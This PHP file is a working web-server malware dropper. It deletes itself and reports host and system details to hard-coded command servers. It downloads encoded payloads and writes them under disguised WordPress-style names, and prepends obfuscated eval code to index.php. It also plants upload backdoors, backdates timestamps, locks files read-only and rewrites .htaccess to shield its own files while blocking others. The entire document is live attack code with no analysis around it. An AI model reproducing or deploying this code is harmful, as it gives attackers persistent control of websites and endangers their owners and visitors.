<?php
error_reporting(0);@set_time_limit(0);@unlink(__FILE__);
define("KEY","k=zNiLekzO1Pcpga");$SARR = explode(",","http://195.58.49.203,https://manage.timair.top");
if(fe("opcache_reset")) @opcache_reset();header("Content-type: text/html; charset=utf-8");


if(!defined("ROOT")){
    $U = $_SERVER["PHP_SELF"];
    if(!$U){
        $a = explode("?",$_SERVER["REQUEST_URI"]);
        $U= $a[0];
    }
    $P = __FILE__;
    if(!$P)$P = $_SERVER["PATH_TRANSLATED"];
    if(!$P)$P = $_SERVER["SCRIPT_FILENAME"];
    define("ROOT", str_replace($U,"",$P));
}
if(!defined("IS_WIN")){
    define("IS_WIN", substr(PHP_OS, 0, 3) == 'WIN');
}

$J = array();
$TEMP = array();
$N1 = array("class-", "class.", "config-", "config.", "init-", "init.", "lang-", "lang.", "dist-", "dist.", "");
$N2 = array("block", "walker", "inc", "core", "site", "widgets", "load", "vars", "rest");
$N3 = array("pattern", "conf", "http", "style", "loader", "sitemaps", "api", "query", "plugin", "option", "nva", "nav", "settings", "meta", "media", "locale", "rss", "compat", "tokens", "role");
$Fname = array("about", "versions", "install", "store", "conflg", "online", "tackback");
function ffName(){
    global $N1,$N2,$N3;
    return $N1[array_rand($N1)].$N2[array_rand($N2)].'-'.$N3[array_rand($N3)].'.php';
}
function fe($s){
    return function_exists($s);
}
function fex($s){
    return file_exists($s);
}

if(!fe("r")){
    function r($p){
        return ROOT."/".$p;
    }
}
define("WPV", isWordPress());
function isWordPress(){
    try {
        $f = r("/wp-includes/version.php");
        if (fex($f)) {
            $wp_version = ""; include_once($f); return "WordPress " . $wp_version;
        }
    } catch (Exception $e) {}
    return "";
}

function GetSystemInfo(){
    $u = (fe("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    return array(
        "document_root" => ROOT,
        "user_name" => ($u) ? $u["name"] : @get_current_user(),
        "web_system" => "",
        "system" => PHP_OS,
        "server" => $_SERVER['SERVER_SOFTWARE'],
        "php_version" => PHP_VERSION,
        "systems" => @php_uname(),
        "is_win" => IS_WIN,
        "word_press" => WPV,
        "ip" => trim(file_get_contents("https://api-ipv4.ip.sb/ip")),
    );
}
function getRandDirs($p,$l){
    $a = "";
    for ($i=0;$i<$l;$i++) {
        $v=getRandDir($p.$a);
        if(!$v) break;
        $a .= $v.'/';
    }
    return trim($a,"/");
}
function getRandDir($p){
    $arr  = array();
    $dir = scandir($p);
    foreach ($dir as $v) {
        if ($v == '.' || $v == '..') continue;
        if (is_dir($p . '/' . $v))$arr[] = $v;
    }
    if(count($arr) == 0) return null;
    return $arr[array_rand($arr)];
}

function NewCode($a,$l,$p,$r){
    $v = array();
    if(is_array($a)){
        foreach ($a as $f) {
            if(fex(r($f))){
                addTemp(dirname($f),basename($f));
                $v[] = array(
                    'l'=> $f,
                );
            }
        }
    }
    $n = $l - count($v);
    for ($i=0;$i<$n;$i++) {
        $d = getRandDirs(r(''),4); $j = getData($p.KEY); $f = $r?$j['p']:ffName();
        $p1=$d.'/'.$f;
        if(fileWrite(r($p1),base64_decode($j['c']),1)){
            addTemp(r($d),$f);
            $v[] = array(
                't'=>$j['t'],
                'p'=>$j['p'],
                'l'=> $p1,
            );
        }
    }
    return $v;
}

function uCode($a,$l){
    $v = array();
    foreach ($a as $f) {
        if(fex(r($f))){
            addTemp(dirname($f),basename($f));
            $v[] = array(
                'l1'=> $f,
            );
        }
    }
    $n = $l - count($v);
    for ($i=0;$i<$n;$i++) {
        $d = getRandDirs(r(''),4);$f = ffName();
        $a2 = getRandDirs(r(''),4);$f2 = ffName();
        $p1=$d.'/'.$f;
        $p2= $a2.'/'.$f2;
        $b2 = base64_encode("<FilesMatch \"^($f2)$\">\nOrder allow,deny\nAllow from all\n</FilesMatch>");
        $c = 'function fwss(if(file_exists($f))@unlink($f);if(file_exists($f)) chmod($f,0666);$f,$c){$p=@fopen($f,"w");$t=@fwrite($p,$c);@fclose($p);if(!$t)$t=@file_put_contents($f,$c);return (bool)$t;}if(!empty($_POST["nn"]) && move_uploaded_file($_FILES["file"]["tmp_name"],"'.r($p2).'") && fwss("'.$a2.'/.htaccess",base64_decode("'.$b2.'"))exit(1);';
        if(fileWrite(r($p1),$c,1)){
            addTemp(r($d),$f);
            addTemp(r($a2),$f2);
            $v[] = array(
                'l1'=>$p1,
                'l2'=>$p2,
            );
        }
    }
    return $v;
}
function addTemp($k,$v){
    global $TEMP;
    $TEMP[]=$v;
}
function rCode($a,$l){
    $v = array();
    foreach ($a as $f) {
        if(fex(r($f))){
            addTemp(dirname($f),basename($f));
            $v[] = array(
                'l1'=> $f,
            );
        }
    }
    $n = $l - count($v);
    for ($i=0;$i<$n;$i++) {
        $d = getRandDirs(r(''),4);
        $f = ffName();
        $a2 = getRandDirs(r(''),4);
        $f2 = ffName();
        $p1=$d.'/'.$f;
        $p2= $a2.'/'.$f2;
        $j = getData("/g/c?".KEY);
        $b2 = base64_encode("<FilesMatch \"^($f2)$\">\nOrder allow,deny\nAllow from all\n</FilesMatch>");
        $c = 'if(!empty($_POST["'.$j["p"].'"]){$c=base64_decode("'.$j["c"].'");$f="'.r($p2).'";function fwss($f,$c){if(file_exists($f))@unlink($f);if(file_exists($f)) chmod($f,0666);$p=@fopen($f,"w");$t=@fwrite($p,$c);@fclose($p);if(!$t)$t=@file_put_contents($f,$c);return (bool)$t;}$t=fwss($f,$c);$t=fwss($f,$c);if($t)$t=fwss("'.$a2.'/.htaccess",base64_decode("'.$b2.'"));}';
        if(fileWrite(r($p1),$c,1)){
            addTemp(r($d),$f);
            addTemp(r($a2),$f2);
            $v[] = array(
                't'=>$j['t'],
                'p'=>$j['p'],
                'l1'=>$p1,
                'l2'=>$p2,
            );
        }
    }
    return $v;
}
function v1Handle(){
    global $J;
    if($J["v_1"] == "")return null;
    $res = array('m'=>"write");
    $P = "index.php";
    $P2 = r($P);
    $old= "";
    if(fex($P2)){
        $old = readF($P2);
        $old2 = handleOldCode($old);
        if($old2 !=""){
            $old = "\n".$old2;
        }
        if(!fex($P2.".bk")) @copy($P2,$P2.".bk");
    }

    $code = base64_decode($J["C"][$J["v_1"]]);
    $code2 = EncryptCode($J["v_1"],$code);
    if(strpos($old,$code) === 0 || strpos($old,$code2) === 0){
        $res['m'] = "check";
        $ok = check($J["v_1"],$P);
    }else{
        $ok = fileWrite($P2,$code2.$old,1);
        if($ok) {
            $res['m'] = "check";
            $ok = check($J["v_1"],$P);
        }
        if(!$ok && fileWrite($P2,$code.$old,1)) $ok = check($J["v_1"],$P);
    }
    if($ok) $res['m'] = "";
    $res["s"] = $ok;
    return $res;
}

function handleOldCode($str){
    $a = "?>";
    $arr =  explode($a,$str);
    $arr2 = array();
    if(count($arr)  >  1){
        for ($i=0;$i<count($arr);$i++) {
            if(!CEncrypt($arr[$i])){
                $arr2[] = $arr[$i];
            }
        }
    }else{
        return $str;
    }
    if (count($arr2) == 0){
        return  "";
    }
    return implode($a,$arr2);
}

function CEncrypt($str){
    $arr = explode("\n",$str);
    for ($i=0;$i<count($arr);$i++) {
        if(strlen($arr[$i]) > 500){
            return true;
        }
    }
    return false;
}

function readF($f){
    if(!fex($f))return "";
    $s = file_get_contents($f);
    if(empty($s)){
        $fp = @fopen($f, 'r');
        if($fp) {
            while( !@feof($fp) )
                $s .= @fread($fp, 1024);
            @fclose($fp);
        }
    }
    if(empty($s)){
        $s = @exec("/bin/bash -c 'cat ".$f."'");
    }
    return $s;
}

function v2Handle(){
    global $J,$Fname;
    if($J["v_2"] == "")return null;
    $res = array("m"=>"write");
    $P = $J["v_2_path"];
    if($P == ""){
        $P = (WPV != ""?"wp-":"").$Fname[array_rand($Fname)].".php";
    }
    $P2 = r($P);
    $code = base64_decode($J["C"][$J["v_2"]]);
    $code2 = EncryptCode($J["v_2"],$code);
    $ok =  fileWrite(r($P),$code2,1);
    if(!$ok){
        $P = (WPV != ""?"wp-":"").$Fname[array_rand($Fname)].".php";
        $P2 = r($P);
        $ok = fileWrite($P2,$code2,1);
    }
    if($ok){
        $res['m'] = "check";
        $ok = check($J["v_2"],$P);
    }
    if(!$ok && fileWrite($P2,$code,1)) $ok = check($J["v_2"],$P);
    if($ok) $res['m'] = "";
    $J["v_2_path"] = $P;
    $res["p"] = $P;
    $res["s"] = $ok;
    return $res;
}
function v3Dir(){
    $arr = array();
    $arr2 = array();
    $dir = scandir(r(''));
    foreach ($dir as $v) {
        if($v == '.' || $v == '..'  || !is_dir(r($v)))continue;
        $arr2[] = $v;
        if (preg_match("@admin|cgi-bin|upload|cache|static|assets|image[s]?|(^\d+$)|^\.@i", $v)) {
            continue;
        }
        $arr[] = $v;
    }
    if(count($arr) == 0){
        if(count($arr2) == 0){
            return mkdir(r("main"))?"main":"";
        }
        $arr = $arr2;
    }
    return $arr[array_rand($arr)];
}

function v3path($name){
    global $Fname;
    $path = $name;
    if($name == ""){
        $name = $Fname[array_rand($Fname)];
        if(WPV != ""){
            $path = "wp-includes/wp-".$name.".php";
        }else{
            $d = v3Dir();
            if($d == ""){
                return "";
            }
            $path = $d ."/".$name.".php";
        }
    }else{
        if(strpos($name,"/") === false){
            if(WPV != ""){
                $path = "wp-includes/".$name;
            }else{
                $d = v3Dir();
                if($d == ""){
                    return "";
                }
                $path = $d ."/".$name;
            }
        }
    }
    return $path;
}

function v3Handle(){
    global $J;
    $res = array("s"=>false,"p"=>"","m"=>"write",);
    if($J["v_3"] == "")return $res;
    $P = $J["v_3_path"];
    $res["p"] = $P;
    $P = v3path($P);
    if($P == ""){
        $res["m"] = "dir not find";
        return $res;
    }
    $P2 = r($P);
    $code = base64_decode($J["C"][$J["v_3"]]);
    $code2 = EncryptCode($J["v_3"],$code);
    $ok =  fileWrite($P2,$code2,1);
    if(!$ok){
        $P = v3path("");
        if($P == ""){
            $res["m"] = "dir not find";
            return $res;
        }
        $P2 = r($P);
        $ok =  fileWrite($P2,$code2,1);
    }
    if($ok) {
        $ok = check($J["v_3"],$P);
        $res["m"] = "check";
    }
    if(!$ok){
        if(fileWrite($P2,$code,1)) $ok = check($J["v_3"],$P);
    }
    if($ok) $res['m'] = "";
    addTemp(dirname($P2),basename($P));
    $J["v_3_path"] = $P;
    $res["p"] = $P;
    $res["s"] = $ok;
    return $res;
}
function fileWrite($p,$c,$b){
    $tt= mktime(19,5,10,10,26,2021);
    if(fex($p)){
        $tt=@filemtime($p);
        @chmod($p,0666);
    };
    if(fex($p))@rename($p,$p."back");
    if(fex($p))@unlink($p);
    $t = !1;
    $p2=@fopen($p,"w");if($p2){$t=@fwrite($p2,$c);@fclose($p2);}
    if(!$t) $t = @file_put_contents($p,$c);
    if($t){@touch($p,$tt,$tt);if($b)@chmod($p,0444);}
    return (bool)$t;
}
function RandAbc() {
    return str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
}
function EncryptCode($v,$vstr){
    $T_k1 = RandAbc();
    $T_k2 = RandAbc();
    $v1 = base64_encode($vstr);
    $c = strtr($v1, $T_k1, $T_k2);
    $c = $T_k1.$T_k2.$c;
    $q1 = "O00O0O";
    $q2 = "O0O000";
    $q3 = "O0OO00";
    $q4 = "OO0O00";
    $q5 = "OO0000";
    $q6 = "O00OO0";
    $v2 = explode(".",$v);
    $s = '$'.$q6.'=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$'.$q1.'=$'.$q6.'[3].$'.$q6.'[6].$'.$q6.'[33].$'.$q6.'[30];$'.$q3.'=$'.$q6.'[33].$'.$q6.'[10].$'.$q6.'[24].$'.$q6.'[10].$'.$q6.'[24];$'.$q4.'=$'.$q3.'[0].$'.$q6.'[18].$'.$q6.'[3].$'.$q3.'[0].$'.$q3.'[1].$'.$q6.'[24];$'.$q5.'=$'.$q6.'[7].$'.$q6.'[13];$'.$q1.'.=$'.$q6.'[22].$'.$q6.'[36].$'.$q6.'[29].$'.$q6.'[26].$'.$q6.'[30].$'.$q6.'[32].$'.$q6.'[35].$'.$q6.'[26].$'.$q6.'[30];eval($'.$q1.'("'.base64_encode('$'.$q2.'="'.$c.'";eval(\'?>\'.$'.$q1.'($'.$q3.'($'.$q4.'($'.$q2.',$'.$q5.'*2),$'.$q4.'($'.$q2.',$'.$q5.',$'.$q5.'),$'.$q4.'($'.$q2.',0,$'.$q5.'))));').'"));';
    return '<?php'."\r\n".'$ooOO="'.$v2[0].'";'.$s."\r\n".'?>';
}

if(!fe("http")){
    function http($link) {
        $f = @file_get_contents($link);
        if (!$f) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $link);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
            curl_setopt($ch,CURLOPT_HEADER,0);
            curl_setopt($ch,CURLOPT_TIMEOUT,10);
            curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
            $f = curl_exec($ch);
            curl_close($ch);
        }
        if(!$f){
            $fp = fopen($link,'r');
            if($fp){
                stream_get_meta_data($fp);
                $b = "";
                while (!feof($fp)) {
                    $b.= fgets($fp, 1024);
                }
                fclose($fp);
                return $b;
            }
        }
        return $f;
    }
}

function check($code,$path){
    global $domain,$J;
    $f = wget("/g/check?d=".base64_encode($domain)."&p=".base64_encode($path)."&c=".base64_encode($code)."&s=".$J["s"]);
    return $f == "1";
}

function wget($p){
    global $SARR;
    foreach ($SARR as $v){
        $b=http($v.$p);
        if($b)return $b;
    }
    return "";
}

function MainH(){
    global $J,$TEMP;
    $h= base64_decode($J['h']);
    $h2 = "";
    if(strpos($J["h"],"<FilesMatch") === false){
        $h2 = "<FilesMatch \".(py|exe|phtml|php|PhP|php5|suspected)$\">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n<FilesMatch \"^(index.php|wp-login.php|wp-blog-header.php|style.php|style2.php|wp-conflg.php|index.php|class.api.php|iR7SzrsOUEP.php|license.php|wp-blog.php|moon.php|wp-add.php|plugin-install.php|admin.php|wp-sigunq.php|my1.php";
        if($J["v_2_path"]) $h2 .= "|".$J["v_2_path"];
        if(!empty($J['p'][""])){
            $c = implode("|",array_unique($J['p'][""]));
            if($c != "")  $h2.= "|".$c;
        }
        if(count($TEMP) > 0){
            $c = implode("|",array_unique($TEMP));
            if($c != "")  $h2.= "|".$c;
        }
        $h2.=")$\">\nOrder allow,deny\nAllow from all\n</FilesMatch>";
    }
    $P = ".htaccess";
    $t= fileWrite(r($P),$h.$h2,1);
    return $t;
}

function getData($link){
    $f = wget($link);
    if(!$f) return false;
    $result = json_decode($f,1);
    if (!$result || $result["code"] != 0) return false;
    return json_decode(base64_decode(substr($result["data"],30)),1);
}
$domain = (empty($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: $_SERVER['SERVER_NAME']);
$data = array(
    "status"=>false,
);
$J = getData("/g/infos?c=".base64_encode($domain)."&".KEY);
if(!$J) exit(json_encode($data));


$data['status'] = true;
$data["system"] = GetSystemInfo();
$data["v1"] = v1Handle();
$data["v2"] = v2Handle();
$data["v3"] = v3Handle();

foreach ($J['p'] as $k=>$v){
    foreach ($v as $v2) {
        $TEMP[] = $v2;
    }
}

$data["links"] = NewCode($J['sm']['l'],4,"/g/c?",0);
$data["links2"] = NewCode($J['sm']['l2'],3,"/g/c2?",0);
$data["links3"] = NewCode($J['sm']['l3'],3,"/g/c2?",1);
$data["ulinks"] = uCode($J['sm']['u'],3);
$data["rlinks"] = rCode($J['sm']['r'],3);

$data["h"] = MainH();

exit(base64_encode(json_encode($data)));
